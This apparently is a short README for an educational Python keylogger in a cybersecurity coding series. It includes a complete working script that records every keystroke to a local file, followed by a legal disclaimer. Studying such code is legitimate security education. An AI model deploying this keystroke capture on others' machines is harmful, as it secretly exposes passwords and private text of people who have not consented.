# Python Keylogger (Educational Purposes)

## Overview

This repository is part of a cybersecurity coding series, demonstrating how a simple keylogger can be built using Python. The purpose is **educational**, to understand how keyloggers function in a controlled environment.  
## Features

- Logs keystrokes in real-time to a local file (`keystrokes2.txt`).
- Uses Python's `keyboard` library ( (pip install keyboard) 
- Designed for educational testing only.

## Code Example

```python
import keyboard

log_file = 'keystrokes2.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.name}\n')

keyboard.on_press(on_key_press)
keyboard.wait()
```

## Disclaimer

This keylogger is intended **only for educational purposes** . Unauthorized use on systems you do not own or have explicit permission to test on is illegal and unethical.



